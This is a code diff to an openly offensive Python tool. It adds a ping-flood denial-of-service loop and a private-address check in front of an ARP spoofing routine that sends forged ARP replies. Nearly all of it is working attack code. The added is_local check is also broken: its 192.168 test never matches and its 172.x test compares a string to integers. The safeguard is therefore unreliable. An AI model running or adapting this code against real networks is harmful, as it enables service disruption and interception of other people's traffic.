@@ -1,5 +1,6 @@
 import re
 import socket
+import pythonping
 from scapy.all import *
 from scapy.layers.l2 import ARP
 
@@ -63,7 +64,22 @@ def commit_ddos(target: str):
         except socket.gaierror:
             print("Invalid target! Specify a valid IP address or a domain")
 
-    # Attack target
+    print('Committing DoS, press CTRL+C at any moment to stop.')
+    try:
+        while True:
+            # By setting the timeout to 0, we can continuously send ping messages
+            # without waiting for the response, as we don't care about it.
+            pythonping.ping(target, verbose=False, timeout=0)
+    except (KeyboardInterrupt, InterruptedError):
+        print("\nAttack Terminated.")
+    except BaseException:
+        print("An exception occurred, abandoning attack.")
+
+
+def is_local(ip: str) -> bool:
+    ip_bytes = ip.split('.')
+    return ip_bytes[0] == '10' or ip_bytes[0:1] == ['192.168'] or (ip_bytes[0] == '172' and 16 <= ip_bytes[1] <= 31)
+
 
 def commit_arp_spoofing(target: str):
     def packet_handler(packet):
@@ -71,12 +87,15 @@ def commit_arp_spoofing(target: str):
         if arp.op != 1 or arp.psrc != target: # Insuring that the packet is relevant
             return
         send(ARP(op=2,
-                 psrc=get_if_addr(conf.iface),  # Source IP address (pretending to be)
-                 hwsrc='00:00:00:00:00',  # Source MAC address (your fake MAC)
-                 pdst=target,  # Target IP address (who receives the response)
-                 hwdst=arp.hwsrc  # Target MAC address (destination's MAC)
+                 psrc=get_if_addr(conf.iface),
+                 hwsrc='00:00:00:00:00',
+                 pdst=target,
+                 hwdst=arp.hwsrc
                  ))
 
+    if not is_local(target):
+        print('Invalid use, please enter a private ip')
+        return
     print('Committing ARP spoofing, press CTRL+C at any moment to stop.')
     sniff(prn=packet_handler, promisc=True, store=False, filter='arp')
 
